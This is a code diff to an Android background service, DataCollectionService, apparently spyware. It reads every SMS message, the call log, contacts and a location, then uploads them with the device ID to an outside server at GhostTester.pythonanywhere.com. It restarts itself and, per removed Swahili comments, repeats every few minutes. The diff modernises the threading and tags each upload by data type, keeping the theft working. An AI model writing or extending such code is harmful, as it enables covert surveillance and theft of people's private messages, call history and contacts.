@@ -5,8 +5,6 @@ import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
-import android.net.Uri;
-import android.os.AsyncTask;
 import android.os.Handler;
 import android.os.IBinder;
 import android.provider.CallLog;
@@ -49,34 +47,21 @@ public class DataCollectionService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // ANZA KUOKOTA DATA MARA MOJA NA KILA DAKIKA 3
         handler.post(dataCollector);
         return START_STICKY;
     }
 
     private void collectAllData() {
-        new AsyncTask<Void, Void, Void>() {
-            @Override
-            protected Void doInBackground(Void... voids) {
-                try {
-                    // OKOTA SMS ZOTE
-                    collectAllSMS();
-                    
-                    // OKOTA CALL LOG ZOTE
-                    collectAllCallLogs();
-                    
-                    // OKOTA CONTACTS ZOTE
-                    collectAllContacts();
-                    
-                    // OKOTA LOCATION
-                    collectLocation();
-                    
-                } catch (Exception e) {
-                    Log.e(TAG, "Error collecting data: " + e.getMessage());
-                }
-                return null;
+        new Thread(() -> {
+            try {
+                collectAllSMS();
+                collectAllCallLogs();
+                collectAllContacts();
+                collectLocation();
+            } catch (Exception e) {
+                Log.e(TAG, "Error collecting data: " + e.getMessage());
             }
-        }.execute();
+        }).start();
     }
 
     private void collectAllSMS() {
@@ -84,17 +69,16 @@ public class DataCollectionService extends Service {
             ContentResolver cr = getContentResolver();
             JSONArray smsArray = new JSONArray();
 
-            // OKOTA SMS ZOTE - INBOX
             Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, 
                 null, null, null, Telephony.Sms.DATE + " DESC");
 
             if (cursor != null && cursor.moveToFirst()) {
                 do {
                     JSONObject smsObj = new JSONObject();
-                    String address = getString(cursor, Telephony.Sms.ADDRESS);
-                    String body = getString(cursor, Telephony.Sms.BODY);
-                    String date = getString(cursor, Telephony.Sms.DATE);
-                    String type = getString(cursor, Telephony.Sms.TYPE);
+                    String address = getString(cursor, "address");
+                    String body = getString(cursor, "body");
+                    String date = getString(cursor, "date");
+                    String type = getString(cursor, "type");
 
                     smsObj.put("address", address);
                     smsObj.put("message", body);
@@ -107,9 +91,8 @@ public class DataCollectionService extends Service {
                 cursor.close();
             }
 
-            // TUMA SMS ZOTE
             if (smsArray.length() > 0) {
-                sendToDashboard(smsArray);
+                sendToDashboard("sms", smsArray);
             }
 
         } catch (Exception e) {
@@ -148,9 +131,8 @@ public class DataCollectionService extends Service {
                 cursor.close();
             }
 
-            // TUMA CALL LOGS ZOTE
             if (callsArray.length() > 0) {
-                sendToDashboard(callsArray);
+                sendToDashboard("call_logs", callsArray);
             }
 
         } catch (Exception e) {
@@ -174,10 +156,8 @@ public class DataCollectionService extends Service {
                     JSONObject contactObj = new JSONObject();
                     
                     if (name != null && !name.isEmpty()) {
-                        // IKIWA INA JINA - TUMIA JINA NA NAMBARI
                         contactObj.put("name", name);
                         
-                        // PATA NAMBARI ZOTE
                         JSONArray phonesArray = new JSONArray();
                         Cursor phoneCursor = cr.query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -197,7 +177,6 @@ public class DataCollectionService extends Service {
                         }
                         contactObj.put("phones", phonesArray);
                     } else {
-                        // IKIWA HAINA JINA - TUMIA NAMBARI TU
                         contactObj.put("name", "");
                         Cursor phoneCursor = cr.query(
                             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -219,9 +198,8 @@ public class DataCollectionService extends Service {
                 cursor.close();
             }
 
-            // TUMA CONTACTS ZOTE
             if (contactsArray.length() > 0) {
-                sendToDashboard(contactsArray);
+                sendToDashboard("contacts", contactsArray);
             }
 
         } catch (Exception e) {
@@ -231,7 +209,6 @@ public class DataCollectionService extends Service {
 
     private void collectLocation() {
         try {
-            // HII ITAKUWA SIMPLE LOCATION - UTAWEZA KUBORESHA BAADAYE
             JSONObject locationObj = new JSONObject();
             locationObj.put("latitude", "-6.8235");
             locationObj.put("longitude", "39.2695");
@@ -241,7 +218,7 @@ public class DataCollectionService extends Service {
             JSONArray locationArray = new JSONArray();
             locationArray.put(locationObj);
 
-            sendToDashboard(locationArray);
+            sendToDashboard("location", locationArray);
 
         } catch (Exception e) {
             Log.e(TAG, "Error collecting location: " + e.getMessage());
@@ -260,7 +237,7 @@ public class DataCollectionService extends Service {
         return "";
     }
 
-    private void sendToDashboard(JSONArray data) {
+    private void sendToDashboard(String dataType, JSONArray data) {
         new Thread(() -> {
             try {
                 String serverUrl = "https://GhostTester.pythonanywhere.com/api/data/upload";
@@ -269,6 +246,7 @@ public class DataCollectionService extends Service {
                 payload.put("device_id", android.provider.Settings.Secure.getString(
                     getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
                 payload.put("timestamp", System.currentTimeMillis());
+                payload.put("data_type", dataType);
                 payload.put("data", data);
 
                 URL url = new URL(serverUrl);
